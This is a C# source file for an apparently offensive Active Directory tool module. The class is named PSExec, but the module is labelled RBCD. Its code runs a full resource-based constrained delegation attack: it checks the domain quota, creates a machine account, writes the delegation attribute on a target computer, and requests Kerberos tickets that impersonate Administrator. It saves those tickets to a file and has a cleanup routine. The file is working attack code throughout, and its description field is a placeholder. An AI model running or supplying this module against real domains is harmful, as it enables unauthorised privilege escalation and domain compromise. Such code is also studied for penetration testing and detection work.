﻿using System;
using Framework.lib2;
using System.Security.Cryptography;
using System.DirectoryServices.ActiveDirectory;

namespace Framework.Modules
{
    internal class PSExec : Module
    {
        private byte[] initial_allowedtoactonbehalfofotheridentity;
        private new string name = "RBCD";
        private new string shortDesc = "Abuse Write privileges on a machine in order to process Ressource Based Constrain Delegation";
        private new string desc = "Real description of Module1";
        private new option[] options = new option[] { new option("username", false, "", "Username to connect to domain. If null, will use current context"),
                                                      new option("password", false, "", "Password to connect to domain. If null, will use current context"),
                                                      new option("domain", false, "", "Domain to connect to. If null, will use current context"),
                                                      new option("machine", true, "", "Name of the machine to add to the domain (without $)"),
                                                      new option("m_pass", false, "", "Password of the machine added to the domain. Default set to a random string"),
                                                      new option("target", true, "", "Target for the attack. Must be the name of a computer"),
                                                      new option("path", false, "", "Path for machine creation. If null, will use default computers location"),
                                                      new option("dc", false, "", "DC to use for the attack"),
                                                      new option("m_creation", false, "", "Specify if you want to create a new machine on domain. If null, will check if machine exists"),
                                                      new option("impersonate", true, "Administrator", "Name of the user to impersonate"),
                                                      new option("spn", false, "", "SPN you want ticket for. If null, will be cifs/target"),
                                                      new option("outfile", false, "", "Name of the outfile for TGS")
                                                    };
        public PSExec()
        {
            base.options = options;
            base.name = name;
            base.shortDesc = shortDesc;
            base.desc = desc;
        }

        public override void scan()
        {
            if (checkOptions())
            {
                ADScan scanner = new ADScan(getOptions("domain"), getOptions("username"), getOptions("password"));
                Console.WriteLine("Checking ms-ds-MachineAccountQuota attribute...\n");
                string machineAccountQuota = scanner.GetDomainAttribute("ms-ds-machineaccountquota");
                Console.WriteLine("ms-ds-machineaccountquota" + " : " + machineAccountQuota + "\n");
                if (machineAccountQuota.Equals("0"))
                {
                    Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Invalid MachineAccountQuota, attack won't work...");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" MachineAccountQuota OK\n");
                }

                Console.WriteLine("Checking target computer " + getOptions("target") + " msds-allowedtoactonbehalfofotheridentity attribute...\n");
                bool check = scanner.CheckMachineOnBehalf(getOptions("target"));
                if (!check)
                {
                    Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" msds-allowedtoactonbehalfofotheridentity already set, attack won't work");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" msds-allowedtoactonbehalfofotheridentity not set => OK\n");
                }
                return;
            }
            return;
        }

        private void completeOptions()
        {
            Console.WriteLine("Setting up missing options...");
            ADScan scanner = new ADScan(getOptions("domain"), getOptions("user"), getOptions("password"));
            if (getOptions("domain") == null)
            {
                setOption("domain", Domain.GetCurrentDomain().Name);
            }
            if (getOptions("dc") == null)
            {
                setOption("dc", scanner.getOlderDC());
            }
            if (getOptions("m_pass") == null)
            {
                RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
                byte[] randomBuffer = new byte[16];
                cryptoServiceProvider.GetBytes(randomBuffer);
                setOption("m_pass", Convert.ToBase64String(randomBuffer));
            }
            if (getOptions("spn") == null)
            {
                setOption("spn", "cifs/" + getOptions("target") + "." + getOptions("domain"));
            }
            if (getOptions("path") == null)
            {
                setOption("path", scanner.GetDomainWellKnownObject("aa312825768811d1aded00c04fd8d5cd"));
            }
            if (getOptions("m_creation") == null)
            {
                setOption("m_creation", scanner.computerExists(getOptions("machine")) ? "false" : "true");
            }
        }

        public override void run()
        {
            if (!checkOptions())
            {
                return;
            }

            completeOptions();

            ADAct actor = new ADAct(getOptions("domain"), getOptions("username"), getOptions("password"));
            if (getOptions("m_creation").ToLower().Equals("true"))
            {
                Console.WriteLine("Adding Computer {0} to domain {1} using DC : {2}...", getOptions("machine"), getOptions("domain"), getOptions("dc"));
                bool m_added = actor.AddMachineToDomain(getOptions("machine"), getOptions("m_pass"), getOptions("path"), getOptions("dc"));
                if (!m_added)
                {
                    Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while adding machine to domain\n");
                    return;
                }
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Machine {0} added with password {1}\n", getOptions("machine"), getOptions("m_pass"));
            }

            ADScan scanner = new ADScan(getOptions("domain"), getOptions("user"), getOptions("password"));
            this.initial_allowedtoactonbehalfofotheridentity = scanner.getMachineOnBehalf(getOptions("target"));

            ACL acl = new ACL(getOptions("domain"), getOptions("username"), getOptions("password"));
            if (acl.setMachineOnBehalfFromMachineName(getOptions("target"), getOptions("machine")))
            {
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine("msds-allowedtoactonbehalfofotheridentity attribute added on {0}\n", getOptions("target"));
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while setting msds-allowedtoactonbehalfofotheridentity attribute\n");
                return;
            }

            //TGT
            TicketRequeter tr = new TicketRequeter(getOptions("domain"), getOptions("machine") + '$', getOptions("m_pass"), getOptions("dc"));
            if (tr.getTGT(false))
            {
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Got TGT for {0}\n", getOptions("impersonate"));
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while acquiring TGT\n");
                return;
            }

            //TGS
            if (tr.getTGSS4U2Self(false, getOptions("impersonate"), getOptions("spn"), getOptions("outfile")))
            {
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine("TGS acquired and written to {0}_{1}_to_{2}@{3}\n", getOptions("outfile"), getOptions("impersonate"), getOptions("spn"), getOptions("domain").ToUpper());
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while acquiring TGS\n");
                return;
            }

            setOption("m_creation", "");
        }

        public override void clean()
        {
            // Reset msds-allowedtoactonbehalfofotheridentity
            ACL acl = new ACL(getOptions("domain"), getOptions("username"), getOptions("password"));
            if (acl.setMachineOnBehalfFromSDBytes(getOptions("target"), this.initial_allowedtoactonbehalfofotheridentity))
            {
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine("msds-allowedtoactonbehalfofotheridentity reset\n");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while resetting msds-allowedtoactonbehalfofotheridentity attribute\n");
                return;
            }

            // Remove machine account
            ADAct actor = new ADAct(getOptions("domain"), getOptions("username"), getOptions("password"));
            if (actor.RemoveMachineOnDomain(getOptions("machine")))
            {
                Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine("Machine account {0} removed\n", getOptions("machine"));
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while removing machine account, will try to disable it\n");
                if (actor.DisableMachineOnDomain(getOptions("machine")))
                {
                    Console.ForegroundColor = ConsoleColor.Green; Console.Write("[+]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine("Machine account {0} disabled\n", getOptions("machine"));
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red; Console.Write("[-]");
                    Console.ForegroundColor = ConsoleColor.White; Console.WriteLine(" Something went wrong while disabling machine account\n");
                }
            }
        }
    }
}
